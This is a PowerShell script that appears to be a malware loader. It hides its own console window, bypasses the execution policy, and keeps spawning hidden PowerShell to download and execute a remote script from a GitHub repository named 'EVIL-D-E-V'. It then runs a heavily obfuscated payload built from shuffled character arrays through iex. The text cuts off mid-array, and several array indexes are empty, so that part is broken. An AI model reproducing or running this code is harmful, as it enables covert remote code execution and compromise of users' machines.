Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindowUtils {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr GetTargetWindow() {
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr parentWindow = GetParent(consoleWindow);
            
            if (parentWindow == IntPtr.Zero) {
                return consoleWindow;
            }
            return parentWindow;
        }
    }
"@

[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null

Set-ExecutionPolicy Bypass -Scope Process -Force
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    while(1) {
        try {
            $code = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/download.ps1")
            $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
            Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
            exit;
        } catch {}
    }
}

$G = ([char](110),[char](107),[char](50),[char](70),[char](86),[char](97),[char](37),[char](53),[char](99),[char](68),[char](92),[char](41),[char](38),[char](45),[char](85),[char](57),[char](84),[char](101),[char](117),[char](49),[char](96),[char](34),[char](35),[char](43),[char](47),[char](48),[char](80),[char](76),[char](12),[char](118),[char](108),[char](104),[char](81),[char](77),[char](94),[char](36),[char](111),[char](33),[char](122),[char](40),[char](102),[char](10),[char](72),[char](83),[char](106),[char](65),[char](91),[char](61),[char](125),[char](109),[char](79),[char](63),[char](32),[char](78),[char](124),[char](114),[char](9),[char](95),[char](112),[char](116),[char](11),[char](51),[char](73),[char](62),[char](44),[char](59),[char](119),[char](126),[char](74),[char](121),[char](56),[char](55),[char](88),[char](105),[char](69),[char](82),[char](58),[char](39),[char](115),[char](67),[char](64),[char](60),[char](87),[char](100),[char](98),[char](93),[char](71),[char](66),[char](42),[char](103),[char](120),[char](89),[char](54),[char](123),[char](52),[char](90),[char](75),[char](113),[char](46),[char](13));$x = ([char](12),[char](92),[char](41),[char](111),[char](93),[char](39),[char](122),[char](38),[char](47),[char](35),[char](69),[char](9),[char](90),[char](102),[char](94),[char](106),[char](119),[char](86),[char](60),[char](42),[char](71),[char](62),[char](97),[char](109),[char](46),[char](79),[char](124),[char](59),[char](75),[char](77),[char](99),[char](80),[char](85),[char](121),[char](33),[char](64),[char](123),[char](81),[char](53),[char](58),[char](72),[char](61),[char](63),[char](10),[char](54),[char](65),[char](96),[char](36),[char](95),[char](55),[char](37),[char](101),[char](68),[char](82),[char](91),[char](57),[char](11),[char](74),[char](110),[char](67),[char](32),[char](118),[char](88),[char](78),[char](34),[char](49),[char](98),[char](73),[char](45),[char](89),[char](107),[char](40),[char](51),[char](50),[char](108),[char](87),[char](13),[char](103),[char](104),[char](113),[char](48),[char](126),[char](52),[char](43),[char](115),[char](66),[char](100),[char](56),[char](83),[char](120),[char](105),[char](116),[char](44),[char](125),[char](84),[char](76),[char](114),[char](70),[char](117),[char](112));$J = ([char](99),[char](56),[char](45),[char](86),[char](75),[char](64),[char](124),[char](117),[char](72),[char](37),[char](114),[char](58),[char](54),[char](35),[char](121),[char](68),[char](60),[char](67),[char](65),[char](42),[char](53),[char](63),[char](115),[char](36),[char](112),[char](38),[char](94),[char](40),[char](84),[char](80),[char](125),[char](90),[char](111),[char](55),[char](126),[char](110),[char](74),[char](78),[char](123),[char](106),[char](11),[char](100),[char](41),[char](107),[char](57),[char](33),[char](83),[char](116),[char](73),[char](62),[char](109),[char](101),[char](70),[char](39),[char](119),[char](120),[char](104),[char](97),[char](87),[char](102),[char](113),[char](92),[char](47),[char](9),[char](103),[char](118),[char](61),[char](43),[char](48),[char](69),[char](44),[char](49),[char](34),[char](50),[char](96),[char](93),[char](91),[char](98),[char](51),[char](32),[char](13),[char](10),[char](66),[char](88),[char](105),[char](59),[char](108),[char](95),[char](89),[char](71),[char](85),[char](122),[char](52),[char](76),[char](77),[char](46),[char](12),[char](81),[char](82),[char](79));$s = ([char](54),[char](113),[char](92),[char](124),[char](66),[char](109),[char](38),[char](70),[char](108),[char](87),[char](73),[char](85),[char](61),[char](59),[char](33),[char](35),[char](58),[char](53),[char](78),[char](48),[char](91),[char](45),[char](119),[char](126),[char](82),[char](37),[char](99),[char](93),[char](43),[char](49),[char](125),[char](90),[char](50),[char](47),[char](36),[char](42),[char](51),[char](94),[char](97),[char](11),[char](75),[char](41),[char](104),[char](52),[char](117),[char](56),[char](112),[char](34),[char](39),[char](44),[char](32),[char](123),[char](103),[char](40),[char](80),[char](74),[char](105),[char](64),[char](9),[char](95),[char](98),[char](83),[char](67),[char](68),[char](55),[char](107),[char](65),[char](76),[char](46),[char](110),[char](89),[char](72),[char](118),[char](60),[char](13),[char](79),[char](121),[char](84),[char](62),[char](111),[char](77),[char](12),[char](116),[char](81),[char](122),[char](96),[char](115),[char](88),[char](101),[char](100),[char](71),[char](63),[char](69),[char](57),[char](120),[char](10),[char](114),[char](86),[char](102),[char](106));$w = ([char](70),[char](60),[char](112),[char](55),[char](91),[char](10),[char](99),[char](105),[char](32),[char](115),[char](107),[char](52),[char](119),[char](103),[char](93),[char](88),[char](54),[char](85),[char](81),[char](87),[char](62),[char](96),[char](37),[char](56),[char](50),[char](34),[char](80),[char](61),[char](51),[char](98),[char](69),[char](59),[char](44),[char](40),[char](102),[char](84),[char](76),[char](46),[char](63),[char](97),[char](120),[char](53),[char](108),[char](123),[char](116),[char](118),[char](35),[char](74),[char](109),[char](47),[char](41),[char](114),[char](122),[char](64),[char](124),[char](86),[char](121),[char](33),[char](75),[char](113),[char](65),[char](72),[char](104),[char](100),[char](106),[char](101),[char](48),[char](45),[char](83),[char](36),[char](58),[char](78),[char](39),[char](111),[char](77),[char](73),[char](125),[char](89),[char](94),[char](42),[char](66),[char](90),[char](126),[char](117),[char](110),[char](68),[char](92),[char](49),[char](11),[char](38),[char](71),[char](67),[char](13),[char](43),[char](95),[char](12),[char](79),[char](9),[char](82),[char](57));$v = ([char](71),[char](81),[char](68),[char](73),[char](87),[char](123),[char](101),[char](116),[char](96),[char](107),[char](94),[char](83),[char](102),[char](78),[char](100),[char](32),[char](86),[char](113),[char](120),[char](115),[char](36),[char](82),[char](46),[char](114),[char](66),[char](109),[char](53),[char](49),[char](61),[char](62),[char](122),[char](64),[char](34),[char](92),[char](98),[char](95),[char](37),[char](57),[char](88),[char](35),[char](85),[char](41),[char](103),[char](119),[char](75),[char](74),[char](38),[char](60),[char](10),[char](67),[char](89),[char](70),[char](33),[char](90),[char](47),[char](110),[char](76),[char](9),[char](58),[char](99),[char](52),[char](48),[char](118),[char](51),[char](97),[char](121),[char](45),[char](105),[char](72),[char](111),[char](124),[char](43),[char](80),[char](11),[char](55),[char](42),[char](12),[char](91),[char](54),[char](79),[char](104),[char](56),[char](63),[char](50),[char](93),[char](125),[char](69),[char](112),[char](106),[char](77),[char](13),[char](59),[char](44),[char](126),[char](108),[char](39),[char](40),[char](84),[char](65),[char](117));$g = ([char](108),[char](62),[char](120),[char](100),[char](77),[char](65),[char](115),[char](71),[char](84),[char](96),[char](46),[char](126),[char](88),[char](59),[char](97),[char](122),[char](123),[char](119),[char](105),[char](42),[char](11),[char](106),[char](48),[char](52),[char](35),[char](68),[char](67),[char](72),[char](49),[char](53),[char](83),[char](55),[char](82),[char](60),[char](110),[char](12),[char](76),[char](63),[char](117),[char](47),[char](70),[char](33),[char](104),[char](114),[char](101),[char](40),[char](54),[char](93),[char](78),[char](80),[char](107),[char](125),[char](43),[char](56),[char](64),[char](95),[char](37),[char](81),[char](124),[char](36),[char](69),[char](87),[char](38),[char](94),[char](116),[char](34),[char](45),[char](86),[char](118),[char](113),[char](58),[char](98),[char](75),[char](50),[char](92),[char](102),[char](13),[char](39),[char](103),[char](111),[char](91),[char](66),[char](10),[char](74),[char](112),[char](61),[char](89),[char](99),[char](32),[char](121),[char](79),[char](51),[char](109),[char](9),[char](85),[char](90),[char](41),[char](44),[char](57),[char](73));$z = ([char](117),[char](11),[char](111),[char](49),[char](43),[char](12),[char](92),[char](82),[char](81),[char](109),[char](125),[char](78),[char](67),[char](46),[char](9),[char](51),[char](104),[char](75),[char](68),[char](120),[char](32),[char](96),[char](60),[char](77),[char](71),[char](119),[char](110),[char](83),[char](39),[char](38),[char](121),[char](59),[char](69),[char](52),[char](105),[char](74),[char](100),[char](116),[char](113),[char](115),[char](73),[char](95),[char](85),[char](50),[char](48),[char](124),[char](86),[char](33),[char](66),[char](79),[char](114),[char](112),[char](34),[char](98),[char](63),[char](97),[char](91),[char](62),[char](80),[char](84),[char](61),[char](88),[char](65),[char](122),[char](35),[char](107),[char](106),[char](108),[char](102),[char](93),[char](123),[char](70),[char](72),[char](118),[char](10),[char](56),[char](37),[char](44),[char](101),[char](54),[char](90),[char](89),[char](57),[char](53),[char](55),[char](41),[char](13),[char](64),[char](126),[char](94),[char](103),[char](36),[char](99),[char](42),[char](40),[char](47),[char](76),[char](45),[char](58),[char](87));$A = ([char](57),[char](76),[char](63),[char](75),[char](85),[char](106),[char](38),[char](36),[char](68),[char](100),[char](96),[char](78),[char](77),[char](59),[char](114),[char](46),[char](66),[char](71),[char](53),[char](125),[char](116),[char](48),[char](121),[char](94),[char](62),[char](109),[char](54),[char](11),[char](108),[char](60),[char](91),[char](37),[char](104),[char](35),[char](44),[char](13),[char](82),[char](12),[char](34),[char](70),[char](84),[char](65),[char](126),[char](122),[char](41),[char](98),[char](88),[char](61),[char](56),[char](113),[char](45),[char](55),[char](43),[char](90),[char](89),[char](67),[char](99),[char](50),[char](87),[char](86),[char](40),[char](32),[char](119),[char](107),[char](111),[char](115),[char](123),[char](102),[char](95),[char](69),[char](47),[char](80),[char](105),[char](97),[char](52),[char](58),[char](9),[char](74),[char](112),[char](64),[char](10),[char](73),[char](51),[char](93),[char](83),[char](39),[char](49),[char](92),[char](117),[char](103),[char](42),[char](124),[char](79),[char](120),[char](101),[char](81),[char](110),[char](33),[char](72),[char](118));$H = ([char](80),[char](56),[char](126),[char](88),[char](54),[char](111),[char](35),[char](72),[char](65),[char](59),[char](51),[char](43),[char](107),[char](122),[char](81),[char](74),[char](76),[char](33),[char](98),[char](38),[char](73),[char](61),[char](100),[char](103),[char](106),[char](110),[char](86),[char](90),[char](66),[char](99),[char](12),[char](50),[char](69),[char](121),[char](32),[char](93),[char](11),[char](75),[char](77),[char](42),[char](94),[char](89),[char](71),[char](68),[char](55),[char](9),[char](91),[char](45),[char](125),[char](101),[char](62),[char](67),[char](105),[char](37),[char](79),[char](120),[char](82),[char](47),[char](44),[char](96),[char](124),[char](108),[char](85),[char](109),[char](60),[char](112),[char](41),[char](113),[char](49),[char](64),[char](123),[char](10),[char](118),[char](117),[char](58),[char](84),[char](83),[char](63),[char](95),[char](39),[char](46),[char](92),[char](97),[char](102),[char](104),[char](70),[char](119),[char](114),[char](53),[char](13),[char](34),[char](115),[char](57),[char](48),[char](87),[char](52),[char](116),[char](40),[char](36),[char](78));$c = ([char](88),[char](54),[char](33),[char](113),[char](99),[char](49),[char](83),[char](114),[char](107),[char](118),[char](61),[char](9),[char](64),[char](56),[char](39),[char](34),[char](67),[char](80),[char](125),[char](120),[char](55),[char](62),[char](108),[char](35),[char](73),[char](48),[char](91),[char](68),[char](76),[char](44),[char](119),[char](59),[char](32),[char](124),[char](71),[char](89),[char](13),[char](87),[char](69),[char](101),[char](47),[char](38),[char](66),[char](103),[char](78),[char](104),[char](105),[char](112),[char](79),[char](110),[char](81),[char](52),[char](86),[char](70),[char](95),[char](40),[char](11),[char](123),[char](57),[char](51),[char](41),[char](97),[char](126),[char](37),[char](42),[char](102),[char](100),[char](115),[char](10),[char](121),[char](50),[char](82),[char](98),[char](58),[char](106),[char](116),[char](77),[char](36),[char](109),[char](74),[char](92),[char](117),[char](43),[char](60),[char](75),[char](46),[char](72),[char](122),[char](45),[char](12),[char](96),[char](53),[char](85),[char](93),[char](94),[char](63),[char](90),[char](84),[char](65),[char](111));$t = ([char](38),[char](104),[char](109),[char](72),[char](39),[char](70),[char](55),[char](125),[char](68),[char](110),[char](67),[char](117),[char](99),[char](58),[char](61),[char](37),[char](108),[char](88),[char](41),[char](53),[char](101),[char](63),[char](85),[char](62),[char](107),[char](34),[char](79),[char](103),[char](43),[char](82),[char](77),[char](96),[char](69),[char](45),[char](113),[char](91),[char](98),[char](40),[char](13),[char](105),[char](56),[char](111),[char](80),[char](60),[char](47),[char](121),[char](86),[char](50),[char](100),[char](118),[char](123),[char](33),[char](74),[char](35),[char](52),[char](66),[char](71),[char](73),[char](64),[char](102),[char](95),[char](84),[char](81),[char](49),[char](83),[char](75),[char](65),[char](48),[char](97),[char](124),[char](54),[char](51),[char](119),[char](46),[char](78),[char](9),[char](44),[char](87),[char](116),[char](32),[char](36),[char](76),[char](112),[char](115),[char](114),[char](59),[char](57),[char](92),[char](11),[char](94),[char](42),[char](10),[char](106),[char](89),[char](90),[char](126),[char](120),[char](93),[char](122),[char](12));$S = ([char](44),[char](93),[char](13),[char](118),[char](10),[char](74),[char](64),[char](90),[char](100),[char](73),[char](104),[char](55),[char](63),[char](9),[char](119),[char](116),[char](76),[char](121),[char](89),[char](96),[char](72),[char](120),[char](53),[char](108),[char](75),[char](83),[char](62),[char](88),[char](33),[char](115),[char](80),[char](66),[char](94),[char](113),[char](57),[char](92),[char](32),[char](123),[char](47),[char](114),[char](106),[char](51),[char](59),[char](91),[char](122),[char](79),[char](87),[char](117),[char](98),[char](102),[char](71),[char](39),[char](36),[char](11),[char](68),[char](77),[char](34),[char](124),[char](45),[char](84),[char](78),[char](99),[char](35),[char](61),[char](85),[char](95),[char](67),[char](125),[char](105),[char](49),[char](54),[char](81),[char](101),[char](52),[char](112),[char](60),[char](109),[char](107),[char](43),[char](58),[char](50),[char](12),[char](97),[char](65),[char](37),[char](110),[char](56),[char](46),[char](48),[char](126),[char](111),[char](86),[char](42),[char](82),[char](40),[char](38),[char](69),[char](41),[char](103),[char](70));$n = ([char](43),[char](101),[char](10),[char](55),[char](105),[char](97),[char](102),[char](109),[char](9),[char](96),[char](54),[char](77),[char](59),[char](119),[char](86),[char](46),[char](66),[char](120),[char](125),[char](58),[char](113),[char](12),[char](61),[char](41),[char](112),[char](88),[char](94),[char](83),[char](13),[char](84),[char](40),[char](56),[char](80),[char](90),[char](75),[char](68),[char](92),[char](49),[char](69),[char](116),[char](91),[char](82),[char](72),[char](98),[char](124),[char](45),[char](110),[char](65),[char](74),[char](11),[char](37),[char](42),[char](71),[char](121),[char](122),[char](53),[char](64),[char](118),[char](38),[char](81),[char](35),[char](33),[char](39),[char](48),[char](36),[char](111),[char](57),[char](44),[char](79),[char](67),[char](95),[char](93),[char](78),[char](63),[char](123),[char](34),[char](100),[char](107),[char](87),[char](52),[char](104),[char](70),[char](117),[char](115),[char](106),[char](126),[char](50),[char](85),[char](62),[char](73),[char](51),[char](114),[char](60),[char](89),[char](47),[char](108),[char](99),[char](32),[char](76),[char](103));$M = ([char](47),[char](45),[char](92),[char](122),[char](96),[char](59),[char](99),[char](68),[char](11),[char](74),[char](76),[char](64),[char](113),[char](115),[char](73),[char](38),[char](66),[char](35),[char](33),[char](77),[char](58),[char](82),[char](80),[char](103),[char](57),[char](105),[char](90),[char](78),[char](124),[char](107),[char](83),[char](72),[char](98),[char](101),[char](93),[char](55),[char](46),[char](112),[char](123),[char](50),[char](34),[char](117),[char](53),[char](37),[char](89),[char](9),[char](41),[char](44),[char](70),[char](111),[char](12),[char](88),[char](121),[char](110),[char](86),[char](62),[char](97),[char](120),[char](125),[char](104),[char](43),[char](79),[char](54),[char](39),[char](75),[char](119),[char](71),[char](118),[char](51),[char](65),[char](91),[char](69),[char](85),[char](106),[char](32),[char](61),[char](102),[char](109),[char](95),[char](42),[char](52),[char](36),[char](114),[char](56),[char](48),[char](84),[char](87),[char](108),[char](67),[char](49),[char](116),[char](63),[char](10),[char](126),[char](100),[char](94),[char](60),[char](81),[char](13),[char](40));iex (($z[91],$G[31],$x[90],$s[89],$t[48],$c[39],$G[],$A[65],$c[75],$s[38],$x[96],$c[75],$n[82],$v[87],$M[74],$M[75],$c[32],$J[72],$A[4],$G[58],$M[94],$J[57],$g[64],$M[33],$H[34],$z[12],$z[67],$t[39],$n[1],$w[84],$v[7],$w[25],$z[74],$G[35],$s[82],$c[61],$J[22],$c[8],$t[60],$z[55],$z[92],$G[59],$J[84],$w[73],$M[53],$x[60],$s[12],$A[61],$A[11],$n[1],$s[22],$c[88],$s[61],$G[8],$A[32],$A[94],$g[3],$c[81],$c[22],$c[39],$t[48],$n[29],$A[73],$z[39],$J[43],$H[8],$c[4],$z[37],$z[34],$w[73],$w[84],$t[79],$n[45],$z[32],$v[18],$A[94],$H[29],$G[18],$w[44],$n[1],$n[97],$t[25],$s[5],$G[78],$w[62],$H[96],$x[22],$J[95],$c[39],$M[57],$M[33],$G[21],$t[79],$M[1],$s[66],$J[10],$w[13],$G[18],$S[76],$A[94],$s[69],$H[96],$J[79],$A[38],$t[49],$c[72],$g[6],$v[59],$x[96],$A[72],$J[24],$J[47],$s[16],$v[59],$S[39],$A[94],$s[38],$s[82],$c[39],$w[73],$A[45],$J[39],$S[72],$t[12],$S[15],$H[97],$v[8],$x[64],$z[25],$M[13],$t[12],$x[96],$z[34],$A[78],$z[37],$s[68],$H[91],$s[42],$H[49],$z[67],$g[],$v[8],$n[75],$G[11],$G[98],$v[23],$s[44],$z[26],$z[94],$M[4],$n[75],$s[46],$H[5],$w[12],$J[51],$g[43],$J[22],$A[32],$J[51],$c[22],$t[16],$M[74],$n[9],$M[25],$v[43],$t[84],$J[27],$A[85],$g[42],$J[47],$z[37],$M[37],$v[19],$v[58],$n[94],$c[40],$g[43],$w[39],$c[30],$H[80],$t[27],$H[52],$v[7],$v[80],$J[7],$w[29],$J[7],$H[91],$G[17],$M[82],$g[87],$H[5],$v[55],$G[59],$J[51],$z[26],$w[44],$s[68],$z[92],$s[79],$H[63],$A[70],$J[69],$x[17],$x[67],$w[36],$n[45],$G[9],$G[13],$c[38],$n[45],$s[97],$z[95],$J[94],$G[24],$x[96],$x[51],$c[65],$H[91],$n[94],$S[10],$J[51],$w[39],$x[86],$G[78],$n[94],$z[9],$G[5],$v[67],$n[46],$G[24],$A[9],$c[99],$v[43],$M[53],$n[95],$G[36],$t[68],$H[22],$t[73],$n[24],$H[91],$s[29],$A[85],$H[66],$n[44],$c[46],$M[33],$n[17],$t[31],$v[32],$w[32],$x[80],$n[23],$J[27],$w[12],$w[7],$v[55],$t[48],$z[2],$z[25],$t[73],$s[26],$x[74],$c[99],$g[6],$c[39],$J[42],$S[56],$z[74],$w[69],$g[64],$s[38],$s[86],$s[65],$x[48],$z[37],$J[10],$g[18],$s[52],$A[89],$w[65],$c[7],$J[79],$s[12],$H[34],$J[37],$x[51],$s[22],$t[33],$J[46],$s[26],$w[62],$s[88],$v[14],$v[99],$S[23],$w[65],$s[89],$M[85],$c[61],$g[6],$A[63],$M[85],$z[50],$z[34],$J[64],$H[23],$g[44],$J[10],$G[52],$S[58],$v[98],$S[15],$J[93],$S[90],$c[43],$A[92],$s[69],$s[95],$n[64],$M[90],$M[56],$G[78],$g[50],$G[57],$S[29],$t[20],$s[82],$s[82],$g[18],$M[53],$c[43],$c[67],$z[20],$G[47],$M[74],$w[71],$J[51],$J[54],$c[88],$t[64],$v[59],$J[56],$g[44],$z[36],$H[73],$M[87],$x[51],$A[9],$t[61],$x[22],$v[19],$S[77],$v[11],$n[1],$x[91],$c[75],$w[7],$S[85],$x[77],$H[91],$c[6],$n[1],$J[47],$H[34],$x[68],$c[98],$n[95],$G[30],$g[79],$M[65],$z[27],$v[7],$v[64],$S[39],$n[39],$M[14],$J[59],$M[61],$t[9],$z[48],$v[64],$n[39],$S[15],$M[33],$g[43],$M[25],$A[94],$A[65],$z[20],$H[47],$g[25],$t[41],$G[],$n[39],$g[30],$J[47],$n[65],$w[2],$G[62],$A[67],$A[17],$w[73],$v[67],$x[58],$c[43],$s[75],$x[58],$z[48],$J[57],$J[47],$z[37],$w[65],$S[39],$s[56],$s[88],$v[19],$M[74],$G[13],$M[21],$G[18],$g[34],$x[25],$s[69],$S[23],$t[45],$S[9],$J[59],$s[18],$M[33],$A[20],$z[25],$G[36],$M[82],$t[24],$v[98],$J[65],$z[55],$n[4],$g[],$J[57],$H[18],$J[86],$x[51],$n[97],$M[1],$c[27],$M[49],$S[85],$c[75],$w[68],$M[90],$t[41],$n[24],$c[48],$s[69],$S[9],$w[63],$S[23],$w[65],$M[71],$S[85],$H[22],$G[52],$S[58],$M[30],$t[78],$v[64],$S[39],$x[91],$t[77],$A[32],$x[51],$s[69],$G[45],$c[9],$A[73],$w[7],$G[30],$g[14],$t[36],$M[87],$J[51],$c[68],$x[53],$A[94],$H[23],$z[34],$S[29],$s[82],$n[1],$g[43],$z[97],$t[64],$c[4],$s[42],$g[44],$g[3],$t[11],$J[86],$s[88],$t[48],$J[28],$c[61],$z[39],$S[77],$v[15],$n[45],$J[18],$S[61],$G[59],$s[56],$w[73],$A[96],$v[15],$t[80],$s[82],$v[64],$t[83],$w[10],$s[59],$x[22],$M[6],$M[90],$G[73],$M[49],$H[25],$s[50],$J[2],$v[97],$J[10],$c[46],$H[23],$H[23],$J[51],$c[7],$H[34],$G[35],$v[7],$M[56],$S[29],$G[1],$H[78],$s[82],$H[87],$w[7],$t[27],$v[42],$A[94],$A[14],$g[88],$v[66],$J[46],$x[51],$s[82],$z[37],$w[7],$t[9],$H[23],$M[13],$s[50],$v[20],$w[44],$c[61],$z[39],$M[29],$v[35],$x[84],$S[72],$M[90],$H[96],$n[4],$J[35],$c[43],$z[39],$s[50],$z[97],$t[61],$s[38],$c[67],$A[63],$A[11],$g[14],$H[63],$v[6],$v[15],$t[80],$g[64],$H[82],$M[13],$v[9],$g[55],$J[35],$g[14],$s[5],$v[6],$t[79],$S[58],$w[85],$s[88],$v[19],$g[87],$n[91],$S[68],$w[2],$g[64],$G[73],$x[3],$w[84],$w[8],$n[75],$c[92],$H[65],$g[3],$A[73],$n[39],$M[33],$v[15],$H[51],$z[67],$A[72],$s[88],$x[58],$J[47],$M[40],$g[88],$H[47],$J[98],$J[7],$x[58],$S[16],$J[51],$s[72],$G[17],$A[28],$w[8],$A[98],$c[46],$g[78],$g[42],$M[33],$g[6],$x[91],$t[79],$J[2],$J[52],$t[41],$M[82],$S[61],$M[33],$z[74],$t[77],$n[91],$w[7],$G[59],$M[33],$n[45],$w[61],$w[73],$S[29],$t[78],$G[52],$M[40],$v[77],$A[97],$x[4],$H[34],$t[42],$w[65],$v[23],$w[9],$J[84],$g[6],$t[78],$z[78],$t[9],$H[29],$g[44],$t[79],$t[66],$M[94],$H[22],$w[65],$M[94],$s[47],$s[50],$J[2],$A[39],$t[41],$n[91],$J[51],$J[64],$t[84],$z[2],$w[83],$c[49],$z[36],$v[49],$S[90],$G[30],$t[41],$x[96],$w[8],$v[],$g[43],$S[72],$S[72],$n[46],$z[74],$t[91],$G[35],$g[64],$c[61],$H[91],$s[65],$c[54],$w[84],$H[82],$S[76],$S[72],$J[79],$n[22],$w[8],$z[52],$s[80],$c[46],$x[30],$x[96],$H[5],$z[39],$J[32],$n[6],$S[15],$M[71],$n[76],$S[98],$H[49],$n[75],$A[80],$t[80],$t[78],$w[39],$z[39],$A[63],$M[78],$t[68],$S[61],$g[64],$H[52],$H[5],$v[55],$J[79],$w[27],$z[20],$c[44],$w[65],$G[66],$v[66],$s[61],$M[6],$M[59],$z[78],$A[9],$w[83],$M[87],$G[17],$t[48],$w[35],$w[39],$w[9],$g[50],$z[62],$H[29],$A[20],$z[34],$G[36],$w[84],$A[61],$H[47],$M[71],$M[57],$z[78],$A[56],$t[11],$G[59],$M[33],$v[15],$z[52],$w[48],$n[83],$J[56],$z[37],$J[57],$x[24],$z[78],$g[2],$z[78],$z[52],$c[32],$s[21],$w[60],$A[14],$c[43],$w[83],$z[9],$M[33],$g[34],$J[47],$J[79],$v[32],$H[72],$c[72],$g[6],$g[87],$H[87],$G[73],$J[24],$G[59],$J[11],$J[],$A[14],$n[1],$A[73],$c[75],$H[49],$A[64],$S[48],$t[92],$A[94],$c[4],$g[64],$n[30],$w[21],$g[65],$x[16],$S[29],$J[],$x[96],$x[90],$A[78],$g[64],$J[95],$s[86],$M[59],$J[51],$n[95],$A[28],$t[31],$S[56],$t[18],$H[80],$n[91],$S[47],$z[26],$c[55],$G[20],$n[75],$J[24],$w[73],$w[12],$A[94],$J[10],$c[67],$w[62],$s[88],$v[94],$M[87],$w[8],$J[74],$v[67],$J[54],$s[96],$w[33],$n[62],$s[42],$v[7],$H[96],$z[51],$G[78],$z[98],$s[33],$S[38],$H[87],$t[68],$s[22],$S[87],$J[64],$g[18],$H[96],$t[1],$J[7],$t[36],$w[83],$n[83],$g[44],$c[7],$J[],$S[90],$S[85],$v[7],$t[20],$H[25],$n[39],$c[85],$c[4],$s[79],$J[50],$n[94],$s[43],$H[10],$g[14],$c[5],$S[11],$c[70],$M[68],$x[8],$s[82],$n[1],$n[83],$G[59],$M[],$v[25],$s[38],$z[34],$A[96],$g[39],$s[89],$z[2],$G[66],$n[46],$n[95],$A[64],$s[38],$z[36],$G[98],$S[74],$z[39],$s[29],$n[62],$J[42],$H[60],$v[67],$J[51],$c[19],$z[21],$H[90],$S[],$M[84],$c[60],$M[99],$c[30],$x[90],$J[35],$G[83],$w[73],$H[86],$v[22],$A[56],$s[8],$G[36],$x[84],$t[20],$s[41],$M[40],$t[91],$J[23],$n[39],$c[61],$x[84],$t[24],$s[59],$G[59],$w[51],$v[67],$J[64],$H[23],$n[1],$G[55],$t[79],$M[75],$g[88],$M[27],$z[78],$w[12],$M[1],$n[27],$S[61],$v[80],$M[33],$w[63],$w[83],$S[23],$z[78],$x[86],$s[77],$A[73],$z[39],$G[1],$S[59],$A[14],$H[52],$g[78],$J[64],$H[49],$s[96],$w[8],$G[13],$w[60],$c[75],$M[10],$t[41],$G[89],$M[61],$s[69],$v[48],$x[47],$x[91],$S[82],$J[22],$n[77],$M[78],$w[9],$s[88],$A[20],$S[15],$z[34],$x[58],$S[98],$G[78],$J[79],$z[60],$M[74],$v[13],$w[65],$t[72],$c[88],$t[64],$A[56],$w[62],$g[44],$t[48],$z[],$t[16],$M[33],$n[76],$A[40],$w[39],$S[29],$w[10],$g[30],$c[39],$J[47],$v[7],$g[18],$S[85],$s[52],$S[29],$c[6],$c[39],$c[75],$s[50],$g[66],$v[98],$s[8],$x[74],$c[99],$n[13],$v[11],$x[91],$H[82],$H[87],$w[44],$M[14],$S[49],$H[54],$z[26],$n[16],$G[5],$M[90],$t[78],$G[17],$J[10],$A[72],$t[20],$x[84],$x[60],$t[33],$t[8],$M[49],$s[69],$S[15],$S[25],$H[96],$G[36],$S[74],$c[24],$s[98],$H[42],$v[69],$G[73],$v[55],$w[13],$H[54],$H[25],$G[87],$G[5],$M[90],$c[75],$x[51],$J[10],$c[46],$x[51],$H[91],$A[61],$S[58],$A[36],$x[98],$A[96],$n[68],$n[46],$g[],$z[30],$c[24],$z[68],$w[71],$w[65],$A[20],$A[62],$z[2],$n[91],$A[63],$H[8],$x[61],$g[14],$A[72],$H[61],$s[38],$t[36],$v[94],$g[44],$t[79],$x[68],$A[8],$A[64],$w[84],$v[7],$g[30],$M[90],$g[79],$w[2],$v[79],$S[85],$s[10],$s[89],$x[74],$c[39],$S[96],$H[25],$S[8],$c[32],$g[66],$g[30],$A[20],$s[38],$c[7],$x[91],$n[78],$s[42],$G[17],$n[46],$J[18],$w[45],$S[82],$H[52],$g[],$S[82],$J[77],$H[61],$x[51],$G[41],$M[21],$w[65],$z[90],$s[56],$s[86],$v[7],$A[94],$c[7],$c[88],$z[27],$t[12],$v[80],$x[51],$w[63],$w[83],$J[86],$H[49],$t[48],$H[75],$A[73],$M[13],$n[77],$s[50],$g[66],$g[5],$H[29],$x[91],$n[4],$w[73],$v[55],$v[15],$M[81],$v[7],$c[61],$s[86],$s[65],$w[94],$S[82],$s[26],$M[90],$S[68],$A[64],$x[58],$J[79],$c[88],$z[59],$t[84],$t[39],$x[77],$c[43],$A[94],$G[55],$n[97],$v[20],$z[37],$v[64],$w[9],$M[29],$v[35],$s[82],$w[51],$t[39],$J[64],$v[42],$S[72],$z[50],$w[8],$g[66],$s[61],$v[6],$z[37],$J[47],$M[25],$A[96],$w[13],$t[83],$n[97],$x[47],$v[7],$H[82],$M[13],$s[65],$s[59],$v[19],$w[65],$J[47],$n[39],$G[73],$x[58],$A[89],$z[39],$t[79],$S[58],$H[75],$w[39],$M[13],$v[9],$c[44],$A[73],$G[49],$S[72],$x[60],$J[23],$J[47],$s[38],$x[84],$s[65],$z[41],$z[26],$z[55],$t[2],$v[6],$n[97],$n[45],$G[9],$s[88],$J[22],$n[96],$A[14],$A[72],$M[37],$J[47],$v[67],$J[32],$s[69],$z[20],$t[25],$c[30],$A[72],$J[35],$H[22],$x[3],$A[62],$G[78],$x[60],$M[13],$A[20],$g[14],$M[82],$t[78],$c[81],$s[46],$w[8],$v[12],$s[56],$H[61],$J[51],$s[47],$G[52],$A[50],$n[41],$c[81],$w[84],$w[36],$s[88],$M[67],$n[1],$c[22],$c[32],$s[71],$g[18],$z[90],$J[56],$c[39],$G[78],$t[78],$n[97],$c[88],$w[],$s[79],$t[84],$w[6],$v[6],$A[80],$J[58],$A[14],$n[4],$s[82],$t[20],$z[97],$z[72],$g[79],$S[29],$v[7],$S[36